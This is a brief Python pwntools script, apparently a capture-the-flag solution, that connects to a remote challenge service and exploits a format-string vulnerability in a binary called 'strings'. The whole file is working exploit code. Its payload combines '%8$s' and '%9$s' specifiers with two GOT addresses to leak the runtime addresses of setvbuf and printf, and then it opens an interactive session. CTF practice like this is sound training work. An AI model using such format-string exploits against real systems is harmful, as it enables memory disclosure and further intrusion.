from pwn import *

context.binary = elf = ELF('./strings')

#io = process()
#gdb.attach(io, api=True)
io = remote('challs.n00bzunit3d.xyz', 7150)

io.recvuntil(b'? \n')
payload = b'%8$s----%9$s----' + p64(0x404038) + p64(0x404028)
io.sendline(payload)
setvbuf = u64(io.recvuntil(b'----')[:-4].ljust(8, b'\0'))
printf = u64(io.recvuntil(b'----')[:-4].ljust(8, b'\0'))
log.info(f'setvbuf: {hex(setvbuf)}\nprintf: {hex(printf)}')
io.interactive()